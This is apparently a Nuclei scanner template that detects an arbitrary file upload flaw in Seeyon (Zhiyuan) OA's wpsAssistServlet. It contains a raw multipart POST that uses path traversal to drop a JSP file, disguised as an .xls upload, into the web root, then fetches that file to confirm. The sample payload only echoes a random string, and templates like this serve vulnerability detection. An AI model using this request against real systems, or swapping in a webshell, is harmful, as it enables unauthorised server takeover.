id: zhiyuanOA-wpsAssistServlet-file-upload

info:
  name: 致远OA wpsAssistServlet 任意文件上传漏洞
  author: cnaq
  severity: critical  
  description: 致远OA wpsAssistServlet接口存在任意文件上传漏洞，攻击者通过漏洞可以发送特定的请求包上传恶意文件，获取服务器权限
  reference: 
    - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20wpsAssistServlet%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
  tags: zhiyuanOA,file,upload

requests:
  - raw:
      - |+
        POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{randstr}}.jsp&fileId=2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
        Accept-Encoding: gzip

        --59229605f98b8cf290a7b8908b34616b
        Content-Disposition: form-data; name="upload"; filename="123.xls"
        Content-Type: application/vnd.ms-excel

        <%@page import="java.text.*,java.util.*,java.io.*"%><%out.println("{{randstr}}");%>
        --59229605f98b8cf290a7b8908b34616b--

      - |
        GET /{{randstr}}.jsp HTTP/1.1
        Host: {{Hostname}}

    req-condition: true # dsl跨请求处理需要开启选项
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(body_2, "{{randstr}}")'
        condition: and
    

